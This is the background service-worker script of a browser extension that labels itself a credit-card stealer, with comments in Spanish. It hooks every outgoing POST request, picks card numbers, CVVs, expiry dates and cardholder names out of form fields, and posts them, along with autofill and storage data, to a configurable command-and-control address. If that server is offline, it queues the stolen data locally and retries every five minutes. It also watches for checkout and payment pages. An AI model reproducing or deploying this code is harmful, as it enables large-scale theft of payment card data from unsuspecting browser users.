// Background Service Worker - Stealer Core
// Se ejecuta en background del navegador

console.log('[WSU] Extension loaded');

// Configuración del servidor C2
const C2_SERVER = 'http://192.168.110.129:4444/exfil'; // Cambiar por tu C2

// Interceptar formularios de tarjetas de crédito
chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    if (details.method === "POST" && details.requestBody) {
      try {
        // Interceptar datos de formularios
        if (details.requestBody.formData) {
          const formData = details.requestBody.formData;

          // Buscar campos de tarjetas
          const cardData = extractCardData(formData);
          if (cardData) {
            exfiltrateData('form_intercept', cardData);
          }
        }
      } catch (e) {
        console.error('[WSU] Error intercepting:', e);
      }
    }
  },
  {urls: ["<all_urls>"]},
  ["requestBody"]
);

// Extraer datos de tarjeta de formularios
function extractCardData(formData) {
  const patterns = {
    cardNumber: /card.?num|cc.?num|credit.?card/i,
    cvv: /cvv|cvc|security.?code/i,
    expiry: /exp|expir/i,
    name: /card.?name|holder/i
  };

  const data = {};
  let hasCardData = false;

  for (const [key, value] of Object.entries(formData)) {
    if (patterns.cardNumber.test(key)) {
      data.cardNumber = value[0];
      hasCardData = true;
    } else if (patterns.cvv.test(key)) {
      data.cvv = value[0];
    } else if (patterns.expiry.test(key)) {
      data.expiry = value[0];
    } else if (patterns.name.test(key)) {
      data.name = value[0];
    }
  }

  return hasCardData ? data : null;
}

// Exfiltrar datos al C2
async function exfiltrateData(type, data) {
  try {
    const payload = {
      type: type,
      timestamp: new Date().toISOString(),
      browser: await getBrowserInfo(),
      data: data
    };

    // Intentar enviar al C2
    try {
      await fetch(C2_SERVER, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
      console.log('[WSU] Data exfiltrated');
    } catch (e) {
      // Si el C2 no está disponible, guardar en storage local
      await chrome.storage.local.set({
        [`pending_${Date.now()}`]: payload
      });
      console.log('[WSU] Saved to local storage (C2 offline)');
    }
  } catch (e) {
    console.error('[WSU] Exfiltration error:', e);
  }
}

// Obtener información del navegador
async function getBrowserInfo() {
  const info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
  };

  // Detectar el navegador específico
  if (navigator.userAgent.includes('Edg/')) {
    info.browser = 'Edge';
  } else if (navigator.userAgent.includes('Chrome/')) {
    info.browser = 'Chrome';
  } else if (navigator.userAgent.includes('Brave/')) {
    info.browser = 'Brave';
  } else {
    info.browser = 'Chromium';
  }

  return info;
}

// Listener para mensajes del content script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'autofill_data') {
    exfiltrateData('autofill', message.data);
    sendResponse({success: true});
  } else if (message.type === 'storage_data') {
    exfiltrateData('storage', message.data);
    sendResponse({success: true});
  }
  return true; // Keep channel open for async response
});

// Intentar enviar datos pendientes cada 5 minutos
setInterval(async () => {
  try {
    const items = await chrome.storage.local.get();
    for (const [key, value] of Object.entries(items)) {
      if (key.startsWith('pending_')) {
        try {
          await fetch(C2_SERVER, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(value)
          });
          // Si tuvo éxito, eliminar del storage
          await chrome.storage.local.remove(key);
          console.log('[WSU] Sent pending data:', key);
        } catch (e) {
          // C2 aún offline, mantener en storage
        }
      }
    }
  } catch (e) {
    console.error('[WSU] Error sending pending data:', e);
  }
}, 5 * 60 * 1000); // Cada 5 minutos

// Hook para cuando se abre una página de pago
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    // Detectar páginas de checkout/pago
    const paymentPatterns = [
      /checkout/i,
      /payment/i,
      /billing/i,
      /cart/i,
      /order/i
    ];

    if (paymentPatterns.some(pattern => pattern.test(tab.url))) {
      console.log('[WSU] Payment page detected:', tab.url);
      // Inyectar script para capturar formularios
      chrome.tabs.sendMessage(tabId, {
        type: 'payment_page',
        url: tab.url
      });
    }
  }
});

console.log('[WSU] Background worker initialized');
